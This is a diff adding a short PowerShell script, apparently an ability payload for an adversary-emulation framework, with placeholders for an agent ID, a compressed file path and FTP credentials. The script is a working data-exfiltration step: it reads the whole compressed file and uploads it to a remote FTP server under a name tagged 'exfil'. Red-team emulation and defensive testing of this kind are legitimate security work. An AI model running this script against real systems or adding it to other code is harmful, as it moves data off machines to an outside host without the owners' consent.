@@ -1,0 +1,16 @@
+$SourceFile = (Get-Item #{host.dir.compress});
+$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";
+$ftp = [System.Net.FtpWebRequest]::Create("ftp://#{ftp.server.address}/$RemoteName");
+$ftp = [System.Net.FTPWebRequest]$ftp;
+$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
+$ftp.Credentials = New-Object System.Net.NetworkCredential("#{ftp.user.name}", "#{ftp.user.password}");
+$ftp.UseBinary = $true;
+$ftp.UsePassive = $true;
+
+$content = [System.IO.File]::ReadAllBytes("#{host.dir.compress}");
+$ftp.ContentLength = $content.Length;
+$requestStream = $ftp.GetRequestStream();
+$requestStream.Write($content, 0, $content.Length);
+
+$requestStream.Close();
+$requestStream.Dispose();
